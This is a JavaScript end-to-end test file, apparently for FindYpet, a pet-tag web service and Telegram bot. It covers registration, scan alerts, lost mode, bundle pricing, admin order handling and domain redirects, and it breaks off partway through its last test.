// Сквозные тесты API и бота на мок-окружении. Запуск: node test/run.mjs
import assert from 'node:assert/strict';
import { state, KV, makeKV, makeEnv, call, tgUpdate, msg, cb, worker } from './mock.mjs';
import { _test } from '../dist/worker.js';

let passed = 0;
async function test(name, fn) {
  try { await fn(); passed++; console.log('✔', name); }
  catch (e) { console.error('✘', name, '\n  ', e.message); process.exitCode = 1; }
}
const lastTg = (method) => [...state.tg].reverse().find((c) => !method || c.method === method);
const env = makeEnv();

await test('landing, tag page, privacy and /t/ short link are served', async () => {
  for (const p of ['/', '/tag/?id=1', '/privacy/', '/t/101', '/js/i18n.js', '/assets/logo.png', '/assets/mark.png', '/assets/wordmark.png']) {
    const r = await call(env, p);
    assert.equal(r.status, 200, p);
  }
  const t = await (await call(env, '/t/101')).text();
  assert.match(t, /Call my owner/);
  assert.match(t, /id="tgBtn"/);
  assert.match(t, /Allow sharing my location/);
  assert.match(t, /id="i-wa"/);
  assert.match(t, /maps.google.com\/\?q=/);  // точка на карте в сообщении, если нашедший разрешил геолокацию
  const home = await (await call(env, '/')).text();
  assert.match(home, /fastest way home/);
  assert.doesNotMatch(home, /precise location/);
  assert.doesNotMatch(home, /100 ₪/);
  assert.match(home, /id="plans"/);
  const plans = await (await call(env, '/js/plans.js')).text();
  assert.match(plans, /const PRICING = \{"tag":49,"currency":"₪","bundle":4,"care":39\}/);
});

await test('register requires consent; validates phone2', async () => {
  let r = await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Kostya K', phone: '050-123-4567', pet_name: 'Bella', address: 'Haifa' } });
  assert.equal((await r.json()).error_code, 'consent');
  r = await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Kostya K', phone: '050-123-4567', pet_name: 'Bella', address: 'Haifa', phone2: '12', consent: true } });
  assert.equal((await r.json()).error_code, 'phone2');
});

let tagId, token;
await test('register with phone2 + notes stores extras in KV and returns short link', async () => {
  const r = await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Kostya K', phone: '050-123-4567', pet_name: 'Bella', address: 'Haifa, Herzl 1',
    phone2: '052-765-4321', notes: 'Allergic to chicken. Scared of people.', consent: true, lang: 'ru' } });
  const d = await r.json();
  assert.equal(d.success, true);
  tagId = d.id_tag; token = d.telegram_link.split('start=')[1];
  assert.equal(d.tag_url, `http://localhost:8787/t/${tagId}`);
  const x = await KV.get(`x:${tagId}`, 'json');
  assert.equal(x.phone2, '+972527654321');
  assert.ok(x.consent_at);
  assert.equal(d.order_id, `FY${tagId}`);
  assert.equal(d.price, 49); assert.equal(d.total_tags, 1);
  const o = await KV.get(`o:FY${tagId}`, 'json');
  assert.equal(o.price, 49); assert.equal(o.tags_total, 1); assert.equal(o.free, 0);
  assert.equal(d.tags.length, 1);
  const admin = lastTg('sendMessage');
  assert.equal(admin.payload.chat_id, 'admin');
  assert.match(admin.payload.text, /QR/);
  assert.match(admin.payload.text, /New order FY\d+/);
  assert.match(admin.payload.text, /1 tag · 49 ₪ — <b>1 physical tag<\/b>/);
  assert.match(admin.payload.text, /Lid: <b>BELLA<\/b> · 050-123-4567/);
  assert.equal(admin.payload.reply_markup.inline_keyboard[0][2].callback_data, `ord:FY${tagId}:shipped`);
});

await test('/api/tag returns extras; address never exposed', async () => {
  const d = await (await call(env, `/api/tag?id=${tagId}`)).json();
  assert.equal(d.found, true);
  assert.equal(d.owner_name, 'Kostya');
  assert.equal(d.phone2_display, '+972 52-765-4321');
  assert.equal(d.notes, 'Allergic to chicken. Scared of people.');
  assert.equal(d.lost, false);
  assert.equal(d.can_notify, false);
  assert.ok(!JSON.stringify(d).includes('Herzl'));
});

await test('database outage → page opens from the saved copy (KV first), not "not activated"', async () => {
  state.gasDown = true;
  const r = await call(env, `/api/tag?id=${tagId}`);
  const d = await r.json();
  state.gasDown = false;
  assert.equal(d.found, true);
  assert.equal(d.phone, '+972501234567');
  // метка без кэша → temp_error
  state.gasDown = true;
  const d2 = await (await call(env, '/api/tag?id=99999')).json();
  state.gasDown = false;
  assert.equal(d2.error, 'temp_error');
});

await test('location without Telegram and without SMS → not_linked (page falls back to WhatsApp)', async () => {
  const d = await (await call(env, '/api/location', { method: 'POST', body: { id_tag: tagId, lat: 32.8, lon: 35.0 } })).json();
  assert.equal(d.error, 'not_linked');
});

await test('SMS fallback when owner has no Telegram', async () => {
  const smsEnv = makeEnv({ TWILIO_ACCOUNT_SID: 'AC1', TWILIO_AUTH_TOKEN: 'x', TWILIO_FROM: 'FindYpet' });
  const d = await (await call(smsEnv, '/api/location', { method: 'POST', body: { id_tag: tagId, lat: 32.8, lon: 35.0 } })).json();
  assert.equal(d.success, true);
  assert.equal(state.sms.at(-1).To, '+972501234567');
  assert.match(state.sms.at(-1).Body, /maps\.google\.com/);
  const t = await (await call(smsEnv, `/api/tag?id=${tagId}`)).json();
  assert.equal(t.can_notify, true);
});

const CHAT = '5001';
await test('link from site → registered message (in the order language: RU) with short link and settings button', async () => {
  await tgUpdate(env, msg(CHAT, '/start ' + token));
  const m = state.tg.filter((c) => c.method === 'sendMessage' && c.payload.chat_id === CHAT).at(-2);
  assert.match(m.payload.text, new RegExp(`/t/${tagId}`));
  assert.match(m.payload.text, /вы зарегистрированы в FindYpet/);
  assert.equal(m.payload.reply_markup.inline_keyboard[0][0].text, '👀 Страница питомца');
  assert.equal(await KV.get(`lang:${CHAT}`), 'ru');
  assert.equal(lastTg('sendMessage').payload.reply_markup.keyboard[0][0].text, '🐾 Зарегистрировать питомца');
  assert.ok(await KV.get(`chat:${CHAT}`));
});

await test('scan alert in the owner language (RU) has "Lost mode on" button', async () => {
  await new Promise((r) => setTimeout(r, 1100));
  await call(env, '/api/scan', { method: 'POST', body: { id_tag: tagId } });
  const m = lastTg('sendMessage');
  assert.equal(m.payload.chat_id, CHAT);
  assert.match(m.payload.text, /Жетон питомца Bella только что отсканировали!/);
  assert.match(m.payload.text, /\(\d{1,2} окт\.?,? (в )?\d{2}:\d{2}\)/);
  assert.equal(m.payload.reply_markup.inline_keyboard[0][0].callback_data, `lost:${tagId}`);
  assert.equal(m.payload.reply_markup.inline_keyboard[0][0].text, '🚨 Питомец пропал — включить режим поиска');
});

await test('/lang: buttons for 3 languages; choice is saved and the menu switches language', async () => {
  await tgUpdate(env, msg(CHAT, '/lang'));
  const ask = lastTg('sendMessage').payload;
  assert.match(ask.text, /Выберите язык бота/);
  assert.deepEqual(ask.reply_markup.inline_keyboard[0].map((b) => b.callback_data), ['lang_he', 'lang_ru', 'lang_en']);
  await tgUpdate(env, cb(CHAT, 'lang_en'));
  assert.equal(await KV.get(`lang:${CHAT}`), 'en');
  const ok = lastTg('sendMessage').payload;
  assert.match(ok.text, /now speaks English/);
  assert.equal(ok.reply_markup.keyboard[0][0].text, '🐾 Register a pet');
  // кнопка меню на любом из языков работает, даже после смены языка
  await tgUpdate(env, msg(CHAT, '🏷 Мои жетоны'));
  assert.match(lastTg('sendMessage').payload.text, /Your tags/);
});

await test('/lost → asks area → Lost mode on, share text; channel post only for a paid order and after admin approval', async () => {
  const chEnv = makeEnv({ LOST_CHANNEL_ID: '@findypet_lost' });
  const ok = await KV.get(`o:FY${tagId}`, 'json'); ok.status = 'paid'; await KV.put(`o:FY${tagId}`, JSON.stringify(ok));
  await tgUpdate(chEnv, msg(CHAT, '/lost'));
  assert.equal(state.states[CHAT].step, 'lost_area');
  await tgUpdate(chEnv, msg(CHAT, 'Haifa, Carmel https://spam.example @spammer'));
  const x = await KV.get(`x:${tagId}`, 'json');
  assert.equal(x.lost, true);
  assert.equal(x.lost_area, 'Haifa, Carmel'); // ссылки и @упоминания вырезаны
  assert.equal(x.channel_msg_id, undefined);   // без одобрения админа в канал не попадает
  assert.ok(!state.tg.some((c) => c.payload.chat_id === '@findypet_lost'));
  const mod = state.tg.filter((c) => c.payload.chat_id === 'admin').at(-1).payload;
  assert.match(mod.text, /publish to @findypet_lost\?/);
  assert.deepEqual(mod.reply_markup.inline_keyboard[0].map((b) => b.callback_data), [`chan:${tagId}:ok`, `chan:${tagId}:no`]);
  const own = lastTg('sendMessage').payload.text;
  await tgUpdate(chEnv, cb(CHAT, `chan:${tagId}:ok`)); // не админ — ничего
  assert.ok(!state.tg.some((c) => c.payload.chat_id === '@findypet_lost'));
  await tgUpdate(chEnv, cb('admin', `chan:${tagId}:ok`));
  assert.equal((await KV.get(`x:${tagId}`, 'json')).channel_msg_id, 555);
  const post = state.tg.find((c) => c.payload.chat_id === '@findypet_lost');
  assert.match(post.payload.text, /🚨 <b>Bella<\/b>/);
  assert.match(post.payload.text, /חיית מחמד אבודה/); assert.match(post.payload.text, /Потерялся питомец/); assert.match(post.payload.text, /Lost pet\. Seen it\?/);
  assert.match(post.payload.text, new RegExp(`/p/${tagId}$`));
  assert.match(own, /Forward this to local groups/);
  // текст для групп — на трёх языках, сначала язык владельца; ссылка — на объявление, не на жетон
  const codes = [...own.matchAll(/(🇬🇧|🇮🇱|🇷🇺) <code>([^<]+)<\/code>/g)];
  assert.deepEqual(codes.map((c) => c[1]), ['🇬🇧', '🇮🇱', '🇷🇺']);
  for (const c of codes) { assert.match(c[2], new RegExp(`/p/${tagId}$`)); assert.match(c[2], /Haifa, Carmel/); }
  assert.match(own, /No photo yet — send \/photo/);
  const d = await (await call(env, `/api/tag?id=${tagId}`)).json();
  assert.equal(d.lost, true);
  assert.equal(d.lost_area, 'Haifa, Carmel');
});

await test('/found → Lost mode off and channel post edited', async () => {
  const chEnv = makeEnv({ LOST_CHANNEL_ID: '@findypet_lost' });
  await tgUpdate(chEnv, msg(CHAT, '/found'));
  const x = await KV.get(`x:${tagId}`, 'json');
  assert.equal(x.lost, false);
  const edit = lastTg('editMessageText');
  assert.match(edit.payload.text, /is home/);
});

await test('/settings → change notes, remove second contact', async () => {
  await tgUpdate(env, msg(CHAT, '/settings'));
  assert.match(lastTg('sendMessage').payload.text, /Second contact/);
  await tgUpdate(env, cb(CHAT, `set2:${tagId}:notes`));
  await tgUpdate(env, msg(CHAT, "Don't chase, call me"));
  assert.equal((await KV.get(`x:${tagId}`, 'json')).notes, "Don't chase, call me");
  await tgUpdate(env, cb(CHAT, `clr:${tagId}:phone2`));
  assert.equal((await KV.get(`x:${tagId}`, 'json')).phone2, '');
});

await test('cannot control someone else\'s tag', async () => {
  await tgUpdate(env, cb('6666', `lost:${tagId}`));
  assert.match(lastTg('sendMessage').payload.text, /not linked to your Telegram/);
});

await test('bot registration: 3 + 1 → 2 pets + 2 spares (one each), one order, production sheet', async () => {
  const C = '7007';
  await tgUpdate(env, msg(C, '/register'));
  await tgUpdate(env, msg(C, 'Anna'));
  await tgUpdate(env, msg(C, '054-111-2222'));
  await tgUpdate(env, msg(C, 'Rex'));
  await tgUpdate(env, msg(C, 'Tel Aviv'));
  const planMsg = lastTg('sendMessage').payload;
  assert.match(planMsg.text, /How many tags\?/);
  assert.match(planMsg.text, /Lost mode, a second contact and notes/);
  assert.match(planMsg.text, /3 \+ 1 free — 147 ₪ for 4 tags/);
  assert.deepEqual(planMsg.reply_markup.inline_keyboard.map((r) => [r[0].text, r[0].callback_data]),
    [['1 tag — 49 ₪', 'qty_1'], ['2 tags — 98 ₪', 'qty_2'], ['4 tags (3 + 1 free) — 147 ₪', 'qty_4']]);
  await tgUpdate(env, cb(C, 'qty_4'));
  const q = lastTg('sendMessage').payload;
  assert.match(q.text, /4 tags \(3 \+ 1 free\)/);
  assert.deepEqual(q.reply_markup.inline_keyboard.map((r) => r[0].text),
    ['1 pet: Rex (+3 spare)', '2 pets (+2 spare)', '3 pets (+1 spare)', '4 pets']);
  await tgUpdate(env, cb(C, 'fam_n_2'));
  assert.match(lastTg('sendMessage').payload.text, /Name of pet #2/);
  await tgUpdate(env, msg(C, 'Mika'));
  assert.match(lastTg('sendMessage').payload.text, /Spare tag 1 of 2 — for which pet/);
  await tgUpdate(env, cb(C, 'fam_sp_0'));
  assert.match(lastTg('sendMessage').payload.text, /Spare tag 2 of 2 — for which pet/);
  await tgUpdate(env, cb(C, 'fam_sp_1'));
  const conf = lastTg('sendMessage').payload.text;
  assert.match(conf, /Rex — 2 tags \(1 spare\)/);
  assert.match(conf, /Mika — 2 tags \(1 spare\)/);
  assert.match(conf, /4 tags \(3 \+ 1 free\) — 147 ₪ · one-time/);
  assert.match(conf, /Privacy policy/);
  const n = state.tags.length;
  await tgUpdate(env, cb(C, 'reg_ok'));
  const created = state.tags.slice(n);
  assert.deepEqual(created.map((t) => t.pet_name), ['Rex', 'Mika']);
  assert.ok(created.every((t) => t.telegram_chat_id === C && t.phone === '+972541112222' && t.address === 'Tel Aviv'));
  const rx = await KV.get(`x:${created[0].tag_id}`, 'json');
  assert.equal(rx.copies, 2); assert.equal(rx.order_id, `FY${created[0].tag_id}`);
  assert.equal((await KV.get(`x:${created[1].tag_id}`, 'json')).copies, 2);
  const order = await KV.get(`o:FY${created[0].tag_id}`, 'json');
  assert.equal(order.chat_id, C);
  assert.equal(order.items.reduce((s, i) => s + i.copies, 0), 4);
  assert.deepEqual([order.tags_total, order.free, order.price], [4, 1, 147]);
  const admin = [...state.tg].reverse().find((c) => c.payload.chat_id === 'admin').payload.text;
  assert.match(admin, /4 tags \(3 \+ 1\) · 147 ₪ — <b>4 physical tags<\/b>/);
  assert.match(admin, /Tag 4 of 4 — #\d+ \(spare\)/);
  assert.match(admin, /Lid: <b>MIKA<\/b>/);
  const reg = state.tg.filter((c) => c.payload.chat_id === C && c.method === 'sendMessage').at(-2).payload.text;
  assert.match(reg, /Order <b>FY\d+<\/b> · 4 tags \(3 \+ 1\) · 147 ₪/);
  assert.match(reg, /\/care — FindYpet Care, coming soon/);
  assert.match(reg, /Rex<\/b> — tag #\d+ · 2 tags \(incl. 1 spare\)/);
});

await test('bot: 2 tags for one pet → a spare without questions, 98 ₪; old 2 + 1 button (qty_3) → 3 + 1', async () => {
  const reg = async (C, pet, qtyBtn) => {
    await tgUpdate(env, msg(C, '/register'));
    for (const t of ['Gil', '054-121-2121', pet, 'Netanya']) await tgUpdate(env, msg(C, t));
    await tgUpdate(env, cb(C, qtyBtn));
  };
  await reg('7101', 'Kiki', 'qty_2');
  let q = lastTg('sendMessage').payload;
  assert.match(q.text, /<b>2 tags\.<\/b> How many pets/);
  assert.deepEqual(q.reply_markup.inline_keyboard.map((r) => r[0].text), ['1 pet: Kiki (+1 spare)', '2 pets']);
  await tgUpdate(env, cb('7101', 'fam_n_1'));
  let conf = lastTg('sendMessage').payload.text;
  assert.match(conf, /Kiki — 2 tags \(1 spare\)/);
  assert.match(conf, /💳 2 tags — 98 ₪ · one-time/);
  await tgUpdate(env, cb('7101', 'reg_again'));
  await tgUpdate(env, msg('7101', '/cancel'));
  // кнопка из сообщения, отправленного до перехода на 3 + 1
  await reg('7102', 'Momo', 'qty_3');
  q = lastTg('sendMessage').payload;
  assert.match(q.text, /4 tags \(3 \+ 1 free\)/);
  await tgUpdate(env, cb('7102', 'fam_n_1'));
  conf = lastTg('sendMessage').payload.text;
  assert.match(conf, /Momo — 4 tags \(3 spare\)/);
  assert.match(conf, /4 tags \(3 \+ 1 free\) — 147 ₪/);
  await tgUpdate(env, msg('7102', '/cancel'));
});

await test('Telegram blocked → SMS fallback for location', async () => {
  const smsEnv = makeEnv({ TWILIO_ACCOUNT_SID: 'AC1', TWILIO_AUTH_TOKEN: 'x', TWILIO_FROM: 'FindYpet' });
  const t = state.tags.find((x) => x.pet_name === 'Rex'); t.telegram_chat_id = 'blocked';
  const n = state.sms.length;
  const d = await (await call(smsEnv, '/api/location', { method: 'POST', body: { id_tag: t.tag_id, lat: 32, lon: 34.8 } })).json();
  assert.equal(d.success, true);
  assert.equal(state.sms.length, n + 1);
});

await test('works without KV (old behaviour, new features politely off)', async () => {
  const noKv = makeEnv({ FYP_KV: undefined });
  const d = await (await call(noKv, `/api/tag?id=${tagId}`)).json();
  assert.equal(d.found, true);
  assert.equal(d.lost, false);
  await tgUpdate(noKv, msg(CHAT, '/lost'));
  assert.match(lastTg('sendMessage').payload.text, /not switched on/);
});

await test('reminders: sent once after 180 days', async () => {
  await KV.put('chat:8008', JSON.stringify({ since: '2025-01-01T00:00:00Z', last_reminder: '2025-01-01T00:00:00Z' }));
  const n = state.tg.length;
  const pending = [];
  await worker.scheduled({}, env, { waitUntil: (p) => pending.push(p) });
  await Promise.all(pending);
  const sent = state.tg.slice(n).filter((c) => c.method === 'sendMessage');
  assert.deepEqual(sent.map((c) => c.payload.chat_id), ['8008']);
});

await test('setup reports KV status', async () => {
  const d = await (await call(env, '/setup?key=sec')).json();
  assert.match(d.kv, /connected/);
  assert.equal(d.setMyCommands.ok, true);
});

await test('site: 3 + 1 with 1 pet → one tag ×4 (3 spares), 147 ₪', async () => {
  const n = state.tags.length;
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Dana Levi', phone: '052-999-8877', pet_name: 'Luna', address: 'Haifa', consent: true, tags: 4 } })).json();
  assert.equal(d.success, true);
  assert.equal(state.tags.length, n + 1);
  assert.equal(d.total_tags, 4); assert.equal(d.price, 147);
  assert.deepEqual(d.tags.map((t) => [t.pet_name, t.copies]), [['Luna', 4]]);
});

let famTokenTagIds;
await test('site (old page sends plan=family): 3 pets + the free spare → 3 rows, same owner data, one order', async () => {
  const n = state.tags.length;
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Olga K', phone: '053-222-3344', pet_name: 'Tom', address: 'Ashdod, Herzl 5', consent: true, plan: 'family',
    pets: ['Jerry', 'Spike'], phone2: '053-000-1111', notes: 'Tom is deaf' } })).json();
  assert.equal(d.success, true);
  const rows = state.tags.slice(n);
  assert.deepEqual(rows.map((t) => t.pet_name), ['Tom', 'Jerry', 'Spike']);
  assert.ok(rows.every((t) => t.owner_name === 'Olga K' && t.phone === '+972532223344' && t.address === 'Ashdod, Herzl 5'));
  assert.equal(new Set(rows.map((t) => t.tag_id)).size, 3);
  assert.deepEqual(d.tags.map((t) => t.copies), [2, 1, 1]);
  assert.equal(d.total_tags, 4); assert.equal(d.price, 147);
  // второй контакт — для всех, заметки — только для первого питомца
  const x = await Promise.all(rows.map((t) => KV.get(`x:${t.tag_id}`, 'json')));
  assert.ok(x.every((e) => e.phone2 === '+972530001111' && e.order_id === d.order_id));
  assert.equal(x[0].notes, 'Tom is deaf'); assert.equal(x[1].notes, undefined);
  famTokenTagIds = { token: d.telegram_link.split('start=')[1], ids: rows.map((t) => t.tag_id), order: d.order_id };
});

await test('site: 3 + 1 with 2 pets, spares for pet #2 and pet #1; 4 pets — no spares', async () => {
  let d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Ron', phone: '054-555-6666', pet_name: 'Max', address: 'Eilat', consent: true, tags: 4,
    pets: ['Bim'], spare_for: [1, 0] } })).json();
  assert.deepEqual(d.tags.map((t) => [t.pet_name, t.copies]), [['Max', 2], ['Bim', 2]]);
  d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Ron', phone: '054-555-6666', pet_name: 'A1', address: 'Eilat', consent: true, tags: 4,
    pets: ['A2', 'A3', 'A4', 'A5'] } })).json();
  assert.deepEqual(d.tags.map((t) => [t.pet_name, t.copies]), [['A1', 1], ['A2', 1], ['A3', 1], ['A4', 1]]); // 5-й — в отдельный заказ
  assert.equal(d.total_tags, 4); assert.equal(d.price, 147);
});

await test('site: 1 tag ignores extra pets; 2 tags = 98 ₪ (no gift); 3 tags (old 2 + 1 page) become 3 + 1', async () => {
  let d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Ron', phone: '054-555-6666', pet_name: 'Solo', address: 'Eilat', consent: true, tags: 1, pets: ['X', 'Y'] } })).json();
  assert.equal(d.tags.length, 1); assert.equal(d.total_tags, 1); assert.equal(d.price, 49);
  d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Ron', phone: '054-555-6666', pet_name: 'Duo', address: 'Eilat', consent: true, tags: 2, pets: ['Trio'] } })).json();
  assert.equal(d.total_tags, 2); assert.equal(d.price, 98);
  assert.deepEqual(d.tags.map((t) => [t.pet_name, t.copies]), [['Duo', 1], ['Trio', 1]]);
  d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Ron', phone: '054-555-6666', pet_name: 'Uno', address: 'Eilat', consent: true, tags: 2 } })).json();
  assert.deepEqual(d.tags.map((t) => [t.pet_name, t.copies]), [['Uno', 2]]);
  assert.equal((await KV.get(`o:${d.order_id}`, 'json')).free, 0);
  d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Ron', phone: '054-555-6666', pet_name: 'Old', address: 'Eilat', consent: true, tags: 3, pets: ['Page'], spare_for: [1] } })).json();
  assert.equal(d.total_tags, 4); assert.equal(d.price, 147);
  assert.deepEqual(d.tags.map((t) => [t.pet_name, t.copies]), [['Old', 2], ['Page', 2]]);
});

await test('one Start links ALL tags of the order to Telegram', async () => {
  const C = '9009';
  await tgUpdate(env, msg(C, '/start ' + famTokenTagIds.token));
  for (const id of famTokenTagIds.ids) assert.equal(state.tags.find((t) => t.tag_id === id).telegram_chat_id, C);
  assert.equal((await KV.get(`o:${famTokenTagIds.order}`, 'json')).chat_id, C);
  const m = state.tg.filter((c) => c.payload.chat_id === C && c.method === 'sendMessage').at(-2).payload.text;
  assert.match(m, /Tom<\/b>/); assert.match(m, /Jerry<\/b>/); assert.match(m, /Spike<\/b>/);
});

await test('admin order status → customer is notified; others cannot', async () => {
  const C = '9009';
  const n = state.tg.length;
  await tgUpdate(env, cb('6666', `ord:${famTokenTagIds.order}:paid`));
  assert.equal((await KV.get(`o:${famTokenTagIds.order}`, 'json')).status, 'new');
  await tgUpdate(env, cb('admin', `ord:${famTokenTagIds.order}:shipped`));
  const o = await KV.get(`o:${famTokenTagIds.order}`, 'json');
  assert.equal(o.status, 'shipped');
  const toCustomer = state.tg.slice(n).find((c) => c.payload.chat_id === C).payload.text;
  assert.match(toCustomer, /on the way/);
  assert.match(toCustomer, /\/t\/\d+/);
  assert.match(lastTg('sendMessage').payload.text, /Customer notified/);
});

await test('admin status for order without Telegram → admin asked to call', async () => {
  const o = (await KV._dump()) && Object.keys(KV._dump()).find((k) => k.startsWith('o:') && !JSON.parse(KV._dump()[k]).chat_id);
  await tgUpdate(env, cb('admin', `${'ord:' + o.slice(2)}:paid`));
  assert.match(lastTg('sendMessage').payload.text, /please call/);
});

await test('/orders for admin lists open orders; ignored for others', async () => {
  await tgUpdate(env, msg('admin', '/orders'));
  const t = lastTg('sendMessage').payload.text;
  assert.match(t, /Open orders/);
  assert.doesNotMatch(t, new RegExp(famTokenTagIds.order + '\\b')); // отправленный заказ не показываем
  await tgUpdate(env, msg('5555', '/orders'));
  assert.doesNotMatch(lastTg('sendMessage').payload.text, /Open orders/);
});

await test('every tag has everything — old Basic orders too: alerts, second contact, notes, Lost mode', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Basic Ben', phone: '050-777-8888', pet_name: 'Pip', address: 'Holon', consent: true, plan: 'basic',
    phone2: '050-111-1111', notes: 'shy' } })).json();
  const id = d.id_tag, C = '4004';
  assert.equal(d.total_tags, 1); assert.equal(d.price, 49);
  const x = await KV.get(`x:${id}`, 'json');
  assert.equal(x.phone2, '+972501111111'); assert.equal(x.notes, 'shy');
  await tgUpdate(env, msg(C, '/start ' + d.telegram_link.split('start=')[1]));
  const t = await (await call(env, `/api/tag?id=${id}`)).json();
  assert.equal(t.can_notify, true); assert.equal(t.notes, 'shy');
  const n = state.tg.length;
  await new Promise((r) => setTimeout(r, 1100));
  await call(env, '/api/scan', { method: 'POST', body: { id_tag: id } });
  assert.equal(state.tg.slice(n).filter((c) => c.payload.chat_id === C).length, 1);
  await tgUpdate(env, msg(C, '/lost'));
  assert.match(lastTg('sendMessage').payload.text, /Lost mode for Pip/);
  await tgUpdate(env, msg(C, '/cancel'));
  // заказ, сделанный до 06.10 по тарифу, показывается по-старому
  const legacy = { order_id: 'FY1', status: 'new', plan: 'smart', items: [{ tag_id: '1', pet_name: 'Old', copies: 1 }], phone: '0501234567', created_at: '2026-10-01' };
  await KV.put('o:FY1', JSON.stringify(legacy));
  await tgUpdate(env, msg('admin', '/orders'));
  assert.match(lastTg('sendMessage').payload.text, /FY1<\/b> · Special · 79 ₪/);
  // заказ 06–07.10 по акции 2 + 1 — тоже как был
  await KV.put('o:FY2', JSON.stringify({ ...legacy, order_id: 'FY2', plan: undefined, tags_total: 3, free: 1, price: 98 }));
  await tgUpdate(env, msg('admin', '/orders'));
  assert.match(lastTg('sendMessage').payload.text, /FY2<\/b> · 3 tags \(2 \+ 1\) · 98 ₪/);
});

await test('FindYpet Care: /care, waitlist sign-up (once), /start care, site checkbox reaches the admin', async () => {
  const C = '5151';
  await tgUpdate(env, msg(C, '/care'));
  let m = lastTg('sendMessage').payload;
  assert.match(m.text, /FindYpet Care — coming soon/); assert.match(m.text, /39 ₪\/month per owner, covering all your pets/);
  assert.equal(m.reply_markup.inline_keyboard[0][0].callback_data, 'care_yes');
  await tgUpdate(env, cb(C, 'care_yes'));
  assert.ok(await KV.get(`care:${C}`));
  const adm = [...state.tg].reverse().find((c) => c.payload.chat_id === 'admin').payload.text;
  assert.match(adm, /Care waitlist \+1/); assert.match(adm, /Total: <b>1<\/b>/);
  const n = state.tg.filter((c) => c.payload.chat_id === 'admin').length;
  await tgUpdate(env, cb(C, 'care_yes'));
  assert.equal(state.tg.filter((c) => c.payload.chat_id === 'admin').length, n); // повторно админу не пишем
  await tgUpdate(env, msg(C, '/start care'));
  assert.match(lastTg('sendMessage').payload.text, /already on the list/);
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Cara', phone: '050-313-1313', pet_name: 'Bo', address: 'Haifa', consent: true, tags: 1, care: true } })).json();
  assert.equal((await KV.get(`o:${d.order_id}`, 'json')).care_interest, true);
  assert.match(lastTg('sendMessage').payload.text, /Wants to hear when FindYpet Care launches/);
});

await test('several pets: each gets its own second contact and notes; spare tags copy the chosen pet', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Fam Fay', phone: '050-222-3333', pet_name: 'Alfa', address: 'Haifa', consent: true, tags: 4,
    pets: ['Beta'], spare_for: [1, 1],
    pet_extras: [{ phone2: '052-111-0001', notes: 'Alfa notes' }, { phone2: '052-111-0002', notes: 'Beta notes' }] } })).json();
  assert.equal(d.success, true);
  assert.deepEqual(d.tags.map((t) => [t.pet_name, t.copies]), [['Alfa', 1], ['Beta', 3]]);
  const [xa, xb] = await Promise.all(d.tags.map((t) => KV.get(`x:${t.id_tag}`, 'json')));
  assert.equal(xa.phone2, '+972521110001'); assert.equal(xa.notes, 'Alfa notes');
  assert.equal(xb.phone2, '+972521110002'); assert.equal(xb.notes, 'Beta notes');
  const bad = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Fam Fay', phone: '050-222-3333', pet_name: 'Alfa', address: 'Haifa', consent: true, plan: 'family',
    pets: ['Beta', 'Gama'], pet_extras: [{}, { phone2: '12' }] } })).json();
  assert.equal(bad.error_code, 'phone2');
});

await test('old tags without a plan keep all features', async () => {
  const t = state.tags.find((x) => x.pet_name === 'Bella');
  const x = await KV.get(`x:${t.tag_id}`, 'json');
  delete x.plan; await KV.put(`x:${t.tag_id}`, JSON.stringify(x));
  const d = await (await call(env, `/api/tag?id=${t.tag_id}`)).json();
  assert.equal(d.can_notify, true);
});

await test('www → apex redirect; links use SITE_URL (findy-pet.com)', async () => {
  const domEnv = makeEnv({ SITE_URL: 'https://findy-pet.com' });
  const pending = [];
  const r = await worker.fetch(new Request('https://www.findy-pet.com/t/101?x=1'), domEnv, { waitUntil: (p) => pending.push(p) });
  assert.equal(r.status, 301);
  assert.equal(r.headers.get('Location'), 'https://findy-pet.com/t/101?x=1');
  const d = await (await call(domEnv, '/api/register', { method: 'POST', body: {
    owner_name: 'Dom Owner', phone: '050-121-2121', pet_name: 'Doma', address: 'Haifa', consent: true, plan: 'smart' } })).json();
  assert.equal(d.tag_url, `https://findy-pet.com/t/${d.id_tag}`);
  const admin = lastTg('sendMessage').payload.text;
  assert.match(admin, new RegExp(`NFC \\+ 🔳 QR: <code>https://findy-pet.com/t/${d.id_tag}</code>`));
  // QR на напечатанном медальоне — заглавными (HTTPS://FINDY-PET.COM/T/101): ведёт на ту же страницу
  const up = await worker.fetch(new Request('https://findy-pet.com/T/101'), domEnv, { waitUntil: (p) => pending.push(p) });
  assert.equal(up.status, 301);
  assert.equal(up.headers.get('Location'), 'https://findy-pet.com/t/101');
  const upWww = await worker.fetch(new Request('https://WWW.FINDY-PET.COM/T/101'), domEnv, { waitUntil: (p) => pending.push(p) });
  assert.equal(upWww.status, 301);
  assert.match(upWww.headers.get('Location'), /^https:\/\/findy-pet\.com\/[tT]\/101$/);
});

await test('Telegram button: the bot messages the owner (with map pin when shared), no duplicates; Basic gets it too', async () => {
  const tenv = { ...makeEnv(), FYP_KV: makeKV() };
  const reg = async (plan) => (await (await call(tenv, '/api/register', { method: 'POST', body: {
    owner_name: 'Tg Owner', phone: '050-777-8888', pet_name: 'Tuzik', address: 'Haifa', consent: true, plan } })).json());
  const d = await reg('smart');
  const tag = state.tags.find((t) => t.tag_id === String(d.id_tag));
  tag.telegram_chat_id = '9090';
  let before = state.tg.length;
  let r = await (await call(tenv, '/api/found', { method: 'POST', body: { id_tag: d.id_tag } })).json();
  assert.equal(r.success, true);
  const msgs = state.tg.slice(before).filter((c) => c.payload.chat_id === '9090');
  assert.equal(msgs.length, 1);
  assert.match(msgs[0].payload.text, /Tuzik has been found!/);
  assert.match(msgs[0].payload.text, /did not share their location/);
  // повтор в течение минуты — без второго сообщения
  before = state.tg.length;
